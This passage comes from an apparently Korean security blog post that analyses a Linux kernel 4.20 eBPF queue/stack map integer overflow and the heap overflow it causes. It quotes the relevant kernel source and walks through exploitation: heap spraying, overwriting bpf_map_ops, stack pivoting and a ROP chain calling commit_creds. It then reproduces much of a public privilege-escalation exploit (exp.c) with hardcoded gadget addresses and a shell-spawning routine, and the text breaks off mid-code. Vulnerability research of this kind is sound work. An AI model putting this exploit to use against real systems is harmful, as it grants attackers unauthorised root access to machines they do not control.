from</span></span><br><span class="line"><span class="comment">	 * inside bpf map update or delete otherwise deadlocks are possible</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	preempt_disable();</span><br><span class="line">	__this_cpu_inc(bpf_prog_active);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_HASH ||</span><br><span class="line">	    <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_LRU_PERCPU_HASH) &#123;</span><br><span class="line">		err = bpf_percpu_hash_update(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_ARRAY) &#123;</span><br><span class="line">		err = bpf_percpu_array_update(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE) &#123;</span><br><span class="line">		err = bpf_percpu_cgroup_storage_update(<span class="built_in">map</span>, key, value,</span><br><span class="line">						       attr-&gt;flags);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (IS_FD_ARRAY(<span class="built_in">map</span>)) &#123;</span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		err = bpf_fd_array_map_update_elem(<span class="built_in">map</span>, f.file, key, value,</span><br><span class="line">						   attr-&gt;flags);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_HASH_OF_MAPS) &#123;</span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		err = bpf_fd_htab_map_update_elem(<span class="built_in">map</span>, f.file, key, value,</span><br><span class="line">						  attr-&gt;flags);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_REUSEPORT_SOCKARRAY) &#123;</span><br><span class="line">		<span class="comment">/* rcu_read_lock() is not needed */</span></span><br><span class="line">		err = bpf_fd_reuseport_array_update_elem(<span class="built_in">map</span>, key, value,</span><br><span class="line">							 attr-&gt;flags);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_QUEUE ||</span><br><span class="line">		   <span class="built_in">map</span>-&gt;map_type == BPF_MAP_TYPE_STACK) &#123;</span><br><span class="line">		err = <span class="built_in">map</span>-&gt;ops-&gt;map_push_elem(<span class="built_in">map</span>, value, attr-&gt;flags);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		rcu_read_lock();</span><br><span class="line">		err = <span class="built_in">map</span>-&gt;ops-&gt;map_update_elem(<span class="built_in">map</span>, key, value, attr-&gt;flags);</span><br><span class="line">		rcu_read_unlock();</span><br><span class="line">	&#125;</span><br><span class="line">	__this_cpu_dec(bpf_prog_active);</span><br><span class="line">	preempt_enable();</span><br><span class="line">	maybe_wait_bpf_programs(<span class="built_in">map</span>);</span><br><span class="line">out:</span><br><span class="line">free_value:</span><br><span class="line">	kfree(value);</span><br><span class="line">free_key:</span><br><span class="line">	kfree(key);</span><br><span class="line">err_put:</span><br><span class="line">	fdput(f);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>eBPF의 <code>BPF_MAP_UPDATE_ELEM</code> 기능을 사용할 경우 <code>/kernel/bpf/syscall.c</code>에 있는 <code>map_update_elem()</code> 함수가 호출됩니다.</p>
<p>해당 함수의 <code>value = kmalloc(value_size, GFP_USER | __GFP_NOWARN);</code> 부분에서 <code>map-&gt;value_size</code> 만큼의 슬랩 캐시를 할당하는 것과 <code>copy_from_user(value, uvalue, value_size)</code> 부분에서 <code>attr-&gt;value</code>의 값을 할당된 주소 <code>value</code>에 복사하는 것을 볼 수 있습니다.</p>
<p>여기서 <code>map-&gt;value_size</code>는 BPF 맵 초기화 과정에서 <code>bpf_map_init_from_attr()</code> 함수에 의해 <code>attr-&gt;value_size</code> 값이 복사된 것입니다. 즉, 유저 모드에서 유저가 컨트롤할 수 있는 값입니다.</p>
<p>이렇게 할당된 주소값 <code>value</code>를 인자로 <code>queue_stack_map_push_elem()</code> 함수를 호출합니다.</p>
<h5 id="queue-stack-map-push-elem"><a href="#queue-stack-map-push-elem" class="headerlink" title="queue_stack_map_push_elem()"></a>queue_stack_map_push_elem()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">queue_stack_map_push_elem</span><span class="params">(struct bpf_map *<span class="built_in">map</span>, <span class="keyword">void</span> *value,</span></span></span><br><span class="line"><span class="function"><span class="params">				     u64 flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bpf_queue_stack</span> *<span class="title">qs</span> = <span class="title">bpf_queue_stack</span>(<span class="title">map</span>);</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> irq_flags;</span><br><span class="line">	<span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">void</span> *dst;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* BPF_EXIST is used to force making room for a new element in case the</span></span><br><span class="line"><span class="comment">	 * map is full</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">bool</span> replace = (flags &amp; BPF_EXIST);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check supported flags for queue and stack maps */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; BPF_NOEXIST || flags &gt; BPF_EXIST)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	raw_spin_lock_irqsave(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (queue_stack_map_is_full(qs)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!replace) &#123;</span><br><span class="line">			err = -E2BIG;</span><br><span class="line">			<span class="keyword">goto</span> out;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">/* advance tail pointer to overwrite oldest element */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(++qs-&gt;tail &gt;= qs-&gt;size))</span><br><span class="line">			qs-&gt;tail = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dst = &amp;qs-&gt;elements[qs-&gt;head * qs-&gt;<span class="built_in">map</span>.value_size];</span><br><span class="line">	<span class="built_in">memcpy</span>(dst, value, qs-&gt;<span class="built_in">map</span>.value_size);    <span class="comment">// here</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(++qs-&gt;head &gt;= qs-&gt;size))</span><br><span class="line">		qs-&gt;head = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">	raw_spin_unlock_irqrestore(&amp;qs-&gt;lock, irq_flags);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>/kernel/bpf/queue_stack_maps.c</code>에 선언된 <code>queue_stack_map_push_elem()</code> 함수이며 해당 함수가 바로 heap overflow 취약점이 터지는 함수입니다.</p>
<p><code>memcpy(dst, value, qs-&gt;map.value_size);</code> 부분에서 <code>dst</code>는 <code>BPF_MAP_CREATE</code> 기능으로 커널 힙에 할당된 bpf 맵이고 <code>value</code>는 이전 <code>map_update_elem()</code> 함수에서 <code>attr-&gt;value</code>가 커널 힙에 할당된 영역입니다.</p>
<p>integer overflow로 인해 <code>*qs</code>가 가르키는 슬랩 캐시의 크기가 256byte 밖에 되지 않기 때문에 <code>value</code>값과 <code>qs-&gt;map.value_size</code>를 컨트롤해서 heap overflow를 터트릴 수 있습니다.</p>
<h3 id="victim-structure"><a href="#victim-structure" class="headerlink" title="victim structure"></a>victim structure</h3><p>이렇게 터트린 heap overflow를 이용해 덮을 함수 포인터는 <code>struct bpf_map_ops</code>에 있습니다.</p>
<p><code>slab allocator</code>의 특성상 256byte의 슬랩 캐시와 물리적으로 인접하려면 마찬가지로 256byte의 슬랩 캐시를 할당해야 합니다. 그렇기에 다른 모듈의 <code>file_operations</code>을 사용하기 까다로운 상황입니다.</p>
<p>하지만 integer overflow가 터져 할당된 256byte 크기의 <code>struct bpf_queue_stack</code> 자기 자신의 멤버중에 함수 포인터를 가지고있는 <code>struct bpf_map_ops</code>가 있으므로, 똑같이 <code>BPF_MAP_CREATE</code> 기능으로 256byte의 슬랩 캐시를 할당한 뒤 heap overflow로 <code>struct bpf_map_ops</code>를 덮으면 <code>rip control</code>이 가능합니다</p>
<hr>

<h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><p><a href="https://github.com/ww9210/kernel4.20_bpf_LPE/blob/master/exp.c" target="_blank" rel="noopener">ww9210</a>가 작성한 익스플로잇 기준으로 <a href="https://github.com/ret2p4nda" target="_blank" rel="noopener">p4nda</a>좌가 세그먼트 오류를 수정한 익스를 이용해 원리를 설명하도록 하겠습니다.</p>
<h3 id="취약점-체이닝"><a href="#취약점-체이닝" class="headerlink" title="취약점 체이닝"></a>취약점 체이닝</h3><ol>
<li><code>trap frame</code> 구성을 위해 레지스터들을 저장합니다.</li>
<li>stack_pivot_gadget, fakestack 등의 <code>stack pivoting</code>을 위한 가젯, 가짜 스택을 <code>mmap()</code>을 이용해 공간 할당 후 배치합니다.</li>
<li><code>rop_chain</code>을 stack_pivot_gadget의 앞 4바이트 기준으로 <code>mmap()</code>을 이용해 배치합니다.</li>
<li>bpf 맵을 integer overflow를 이용해 256byte 크기로 할당해줍니다. (fd = 3)</li>
<li>힙풍수를 맞추기 위해 256byte의 bpf 맵을 14번 할당해줍니다.  (fd = 4 ~ 17)</li>
<li>처음 할당한 bpf 맵에서 heap overflow를 이용해 물리적으로 인접한 다음 bpf 맵의 <code>map-&gt;ops</code> 멤버를 fakestack으로 덮습니다.</li>
<li>처음 할당한 bpf 맵을 <code>close()</code>할 경우 <code>fakestack-&gt;stack_pivot_gadget</code>이 호출되며 <code>stack pivoting</code>이 일어납니다.</li>
<li><code>stack pivoting</code>과 다른 가젯들로 인해 <code>rop_chain</code>이 실행되고, root 권한을 획득하게 됩니다.</li>
<li>세그먼트 오류로 SIGSEGV 에러가 날 경우, <code>get_shell_again()</code>을 실행해 쉘을 불러옵니다.</li>
</ol>
<h3 id="exploit-code"><a href="#exploit-code" class="headerlink" title="exploit code"></a>exploit code</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -o exp exp.c -static -fno-pie</span></span><br><span class="line"><span class="comment">// This is a SMEP bypass exploit against a integer overflow vulnerability</span></span><br><span class="line"><span class="comment">// in Linux kernel bpf module</span></span><br><span class="line"><span class="comment">// The offset used in this exploit is against a custom compiled kernel.</span></span><br><span class="line"><span class="comment">// exploit author: Wei Wu (ww9210@gmail.com)</span></span><br><span class="line"><span class="comment">// initial poc generated by syzkaller</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   user@syzkaller:~$ ./exp</span></span><br><span class="line"><span class="comment">   rop_payload_initialized</span></span><br><span class="line"><span class="comment">   uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:kernel_t:s0</span></span><br><span class="line"><span class="comment"># uname -a</span></span><br><span class="line"><span class="comment">Linux syzkaller 4.20.0-rc3 #1 SMP Thu Nov 22 15:12:38 CST 2018 x86_64 GNU/Linux</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_NUMBER 14</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;endian.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> native_write_cr4 0xffffffff810037d5<span class="comment">// 0xffffffff81097fcc</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> POPRDX 0xffffffff81002dda</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUMMY 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CRED 0xFFFFFFFF810E3D40 <span class="comment">//0xffffffff810e3670</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS  0xFFFFFFFF810E3AB0 <span class="comment">//0xffffffff810e33e0</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> poprdiret 0xffffffff810013b9</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> popraxret 0xffffffff81029c71</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs 0xffffffff81c00d5a<span class="comment">//0xffffffff81c0095f</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> iretq 0xffffffff8106d8f4</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stack_pivot_gadget 0xffffffff81954dc8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> stack_top_offset 0x674</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> krop_base_to_map 0x81954000</span></span><br><span class="line"><span class="keyword">int</span> rop_start=<span class="number">0x1444</span><span class="number">-8</span>;</span><br><span class="line"><span class="keyword">void</span>* krop_base_mapped;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> user_cs, user_ss, user_rflags;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">save_state</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">            <span class="string">"movq %%cs, %0\n"</span></span><br><span class="line">            <span class="string">"movq %%ss, %1\n"</span></span><br><span class="line">            <span class="string">"pushfq\n"</span></span><br><span class="line">            <span class="string">"popq %2\n"</span></span><br><span class="line">            : <span class="string">"=r"</span>(user_cs), <span class="string">"=r"</span>(user_ss), <span class="string">"=r"</span>(user_rflags)</span><br><span class="line">            :</span><br><span class="line">            : <span class="string">"memory"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">"id"</span>);</span><br><span class="line">    <span class="keyword">char</span> *shell = <span class="string">"/bin/sh"</span>;</span><br><span class="line">    <span class="keyword">char</span> *args[] = &#123;shell, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(shell, args, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"></span><br><span class="line">_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root_payload</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> rop_chain[] = &#123;</span><br><span class="line">    popraxret,</span><br><span class="line">    <span class="number">0x6f0</span>,</span><br><span class="line">    <span class="number">0xffffffff81001c51</span>,<span class="comment">//native_write_cr4,</span></span><br><span class="line">    poprdiret,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    PREPARE_KERNEL_CRED,</span><br><span class="line">    <span class="number">0xffffffff81001c50</span>, <span class="comment">//: pop rsi ; ret</span></span><br><span class="line">    poprdiret,</span><br><span class="line">    <span class="number">0xffffffff81264e0b</span>,<span class="comment">//: push rax; push rsi; ret; //0xffffffff812646fb, //: push rax ; push rsi ; ret</span></span><br><span class="line">    COMMIT_CREDS,</span><br><span class="line">    swapgs,</span><br><span class="line">    <span class="number">0x246</span>,</span><br><span class="line">    iretq,</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">long</span>)&amp;get_shell,</span><br><span class="line">    <span class="number">0</span>,<span class="comment">//user_cs,</span></span><br><span class="line">    <span class="number">0</span>,<span class="comment">//user_rflags,</span></span><br><span class="line">    <span class="number">0</span>,<span class="comment">//krop_base_mapped + 0x4000,</span></span><br><span class="line">    <span class="number">0</span><span class="comment">//user_ss</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * fakestack;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">prepare_krop</span><span class="params">()</span></span>&#123;</span><br><span class="line">    krop_base_mapped=mmap((<span class="keyword">void</span> *)krop_base_to_map,<span class="number">0x8000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (krop_base_mapped&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">"mmap failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fakestack=mmap((<span class="keyword">void</span> *)<span class="number">0xa000000000</span>,<span class="number">0x8000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="number">0x0000000081954dc8</span>=popraxret;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)krop_base_to_map = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x1000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x2000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x3000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x4000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x5000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x6000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(krop_base_to_map+<span class="number">0x7000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x4000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x3000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x2000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x1000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x10</span>) = stack_pivot_gadget;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x7000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x6000</span>) = <span class="number">0</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(fakestack+<span class="number">0x5000</span>) = <span class="number">0</span>;</span><br><span class="line">    rop_chain[<span class="number">12</span>+<span class="number">2</span>]=user_cs;</span><br><span class="line">    rop_chain[<span class="number">13</span>+<span class="number">2</span>]=user_rflags;</span><br><span class="line">    rop_chain[<span class="number">14</span>+<span class="number">2</span>]=(<span class="keyword">unsigned</span> <span class="keyword">long</span>)(fakestack + <span class="number">0x6000</span>);</span><br><span class="line">    rop_chain[<span class="number">15</span>+<span class="number">2</span>]=user_ss;</span><br><span class="line">    <span class="built_in">memcpy</span>(krop_base_mapped+rop_start,rop_chain,<span class="keyword">sizeof</span>(rop_chain));</span><br><span class="line">    <span 